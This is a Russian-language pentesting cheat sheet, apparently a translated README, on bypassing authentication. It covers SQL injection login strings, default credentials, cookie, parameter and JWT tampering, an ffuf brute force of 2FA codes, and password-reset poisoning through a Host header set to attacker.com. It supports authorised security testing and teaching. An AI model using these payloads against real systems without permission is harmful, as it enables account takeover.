<a id="-authentication-bypass-cheatsheet"></a>
# 🔐 Справочник по обходу аутентификации

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[← Русское оглавление](../../README.ru.md) · [Английский оригинал](../README.md)

> **Уточнение к оригиналу.** Изменение ответа или кода состояния в браузере само по себе не обходит серверные проверки. В [примерах PortSwigger по MFA](https://portswigger.net/web-security/authentication/multi-factor) обход возможен при ошибках серверной логики, например отсутствии проверки второго этапа. HTTP-фрагменты с пояснениями, стрелками и отдельными параметрами — иллюстрации. Блоки JSON с комментариями или стрелками также не являются строгим JSON; исходные значения сохранены.


[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   █████╗ ██╗   ██╗████████╗██╗  ██╗    ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗
  ██╔══██╗██║   ██║╚══██╔══╝██║  ██║    ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
  ███████║██║   ██║   ██║   ███████║    ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗
  ██╔══██║██║   ██║   ██║   ██╔══██║    ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
  ██║  ██║╚██████╔╝   ██║   ██║  ██║    ██████╔╝   ██║   ██║     ██║  ██║███████║███████║
  ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝    ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
```

---

<a id="-login-bypass-techniques"></a>
## 🔍 Способы обхода входа

<a id="sql-injection"></a>
### SQL-инъекция
```sql
admin'--
admin' #
' OR '1'='1
' OR 1=1--
") OR ("1"="1
```

<a id="default-credentials"></a>
### Учётные данные по умолчанию
```
admin:admin
admin:password
admin:123456
root:root
test:test
guest:guest
```

<a id="parameter-manipulation"></a>
### Изменение параметров
```http
# Изменить тип пользователя
user_type=admin
role=administrator
isAdmin=true
admin=1

# Пропустить проверку
verified=true
mfa_verified=true
```

---

<a id="-2famfa-bypass"></a>
## 🔑 Обход 2FA/MFA

<a id="response-manipulation"></a>
### Изменение ответа
```http
# Заменить false на true
{"success": false} → {"success": true}
{"2fa_valid": false} → {"2fa_valid": true}
```

<a id="status-code-manipulation"></a>
### Изменение кода состояния
```http
# При 401/403 проверить замену на 200
# Изменить ответ с помощью прокси
```

<a id="direct-navigation"></a>
### Прямой переход
```http
# После входа пропустить страницу 2FA
/login → /2fa → /dashboard
# Проверить прямой переход на /dashboard
```

<a id="code-bruteforce"></a>
### Перебор кодов
```bash
# Четырёхзначные коды
ffuf -u https://target.com/2fa -X POST \
  -d "code=FUZZ" -w <(seq -w 0000 9999)
```

<a id="code-reuse"></a>
### Повторное использование кода
```http
# Проверить старые коды и коды с истёкшим сроком действия
# Проверить повторное использование одного кода
```

<a id="nullempty-values"></a>
### Значения null и пустые значения
```json
{"2fa_code": ""}
{"2fa_code": null}
{"2fa_code": "000000"}
```

---

<a id="-password-reset-bypass"></a>
## 🔓 Обход механизма сброса пароля

> **Уточнение.** [Подмена ссылки сброса](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning) зависит от использования недоверенного Host при её формировании. Токен в ответе не всегда доступен постороннему пользователю; проверяйте привязку к учётной записи и жизненный цикл токена, описанные в [механизмах сброса пароля](https://portswigger.net/web-security/authentication/other-mechanisms).


<a id="host-header-injection"></a>
### Внедрение через заголовок Host
```http
POST /reset HTTP/1.1
Host: attacker.com
X-Forwarded-Host: attacker.com

email=victim@target.com
```

<a id="token-manipulation"></a>
### Изменение токена
```http
# Предсказуемые токены
token=1
token=admin
token=base64(user_id)

# Повторное использование токена
# Проверить свой токен сброса с адресом электронной почты другой учётной записи
```

<a id="parameter-pollution"></a>
### Загрязнение параметров (Parameter Pollution)
```http
email=attacker@evil.com&email=victim@target.com
email[]=attacker@evil.com&email[]=victim@target.com
```

<a id="response-manipulation-1"></a>
### Изменение ответа
```json
// Проверить наличие токена в ответе
{"token": "abc123", "email": "victim@target.com"}
```

---

<a id="-sessioncookie-bypass"></a>
## 🛡️ Обход через сеанс и cookie

<a id="cookie-manipulation"></a>
### Изменение cookie
```http
# Изменить значения
Cookie: isAdmin=false → isAdmin=true
Cookie: user_id=123 → user_id=1
Cookie: role=user → role=admin
```

<a id="jwt-manipulation"></a>
### Изменение JWT

> **Уточнение.** Изменение claims или alg не создаёт корректную подпись JWT. Как объясняет [PortSwigger](https://portswigger.net/web-security/jwt), такие атаки требуют ошибки проверки подписи или обработки алгоритма. Примеры ниже сохранены дословно.

```json
// Изменить утверждения (claims)
{"role": "user"} → {"role": "admin"}
{"alg": "HS256"} → {"alg": "none"}
```

<a id="session-fixation"></a>
### Фиксация сеанса (Session Fixation)

> **Уточнение.** По [OWASP](https://owasp.org/www-community/attacks/Session_fixation), фиксация сеанса требует, чтобы жертва использовала известный атакующему идентификатор, а приложение сохраняло его после аутентификации.

```http
# Заставить браузер жертвы использовать известный атакующему идентификатор сеанса
# Жертва входит с идентификатором сеанса, известным атакующему
```

---

<a id="-quick-reference"></a>
## 📊 Краткий справочник

| Тип обхода | Способ |
|-------------|-----------|
| Вход | SQLi, учётные данные по умолчанию |
| 2FA | Изменение ответа, перебор |
| Сброс пароля | Заголовок Host, повторное использование токена |
| Сеанс | Изменение cookie, JWT |

<a id="common-vulnerable-points"></a>
### Типичные уязвимые механизмы
```
- Формы входа
- Процессы сброса пароля
- Реализации 2FA/MFA
- Функции «Запомнить меня»
- Подтверждение учётной записи
- Реализации OAuth
```

---

<a id="-resources"></a>
## 📚 Ресурсы

- [Аутентификация: PortSwigger](https://portswigger.net/web-security/authentication)
- [Обход аутентификации: HackTricks](https://book.hacktricks.xyz/pentesting-web/authentication-bypass)

---

<p align="center">
  <b>🔐 Находите ошибки аутентификации!</b><br>
  <i>Только для проверок с разрешения владельца!</i>
</p>
